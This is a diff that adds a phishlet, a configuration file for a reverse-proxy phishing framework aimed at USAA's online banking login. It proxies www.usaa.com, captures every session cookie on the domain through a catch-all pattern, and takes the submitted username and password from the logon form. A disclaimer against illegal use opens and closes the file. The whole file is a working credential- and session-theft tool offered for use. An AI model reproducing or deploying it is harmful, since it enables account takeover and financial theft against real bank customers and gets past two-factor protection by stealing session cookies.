@@ -1,0 +1,31 @@
+# THE AUTHOR OF THIS PHISHLET DO NOT SUPPORT ANY ILLEGAL ACTIVITIES...
+
+author: '@i_am_a_Good_Human' 
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'usaa.com', session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: 'www.usaa.com', orig_sub: 'www', domain: 'usaa.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.usaa.com', orig_sub: 'www', domain: 'usaa.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.usaa.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/'  
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'j_password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.usaa.com'
+  path: '/inet/ent_logon/Logon'
+  
+# THE AUTHOR OF THIS PHISHLET DO NOT SUPPORT ANY ILLEGAL ACTIVITIES...  
+  
